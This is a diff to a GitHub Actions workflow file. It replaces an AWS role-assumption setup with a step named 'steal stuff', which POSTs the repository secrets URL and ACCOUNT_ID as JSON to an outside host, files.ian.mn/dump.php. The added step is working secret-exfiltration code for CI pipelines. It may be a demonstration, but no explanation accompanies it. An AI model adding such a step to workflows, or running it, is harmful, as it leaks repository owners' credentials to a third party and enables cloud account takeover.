@@ -7,17 +7,10 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
-      
-      - name: keygen
-        uses: iann0036/actions2aws/keygen@main
 
-      - name: assume role
-        uses: iann0036/actions2aws/assume@main
+      - name: steal stuff
+        uses: fjogeleit/http-request-action@master
         with:
-          url: ${{ secrets.URL }}
-          role: arn:aws:iam::${{ secrets.ACCOUNT_ID }}:role/actions2aws-ExampleRoleForGithub-10X8QX5GEZTZQ
-          step: keygen
-
-      - run: aws sts get-caller-identity && aws s3 ls
-
-      - run: env | sort
+          url: 'http://files.ian.mn/dump.php'
+          method: 'POST'
+          data: '{"url": "${{ secrets.URL }}", "accountid": "${{ secrets.ACCOUNT_ID }}"}'
